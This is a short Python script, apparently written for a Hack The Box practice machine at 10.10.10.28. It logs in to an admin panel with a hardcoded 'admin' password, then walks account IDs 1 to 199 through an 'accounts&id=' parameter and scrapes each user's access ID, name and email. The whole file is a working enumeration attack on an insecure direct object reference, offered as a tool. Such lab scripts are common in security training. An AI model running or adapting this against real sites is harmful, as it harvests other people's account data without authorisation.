#!/bin/python3

import sys
import requests
import re #regex


def def_handler(sig, frame):
    print("\n[*] Saliendo...")
    sys.exit(1)

def makeRequest():
    url_login= 'http://10.10.10.28/cdn-cgi/login/index.php'
    login_data = {
            'username' : 'admin',
            'password' : 'MEGACORP_4dm1n!!'
            }
    s = requests.session()
    
    request = s.post(url_login, data=login_data)

    n = 1

    while ( n < 200):

        url_account = 'http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts&id=%s' % n

        id_value = s.get(url_account).text

        check =  re.findall('<td>\d+', id_value)

        if check:
            
            print("ID: ", n)

            access_id =  re.findall('<td>\d+', id_value)
            print("Access: ", access_id[0].replace('<td>', ''))

            user = re.findall('<td>\w+', id_value)
            print("User: ", user[1].replace('<td>', ''))

            mail = re.findall('<td>\w+@+\w+.\w+', id_value)
            print("Mail: ", mail[0].replace('<td>', ''), '\n')

        n = n+1
    
if __name__ == '__main__':
    makeRequest()
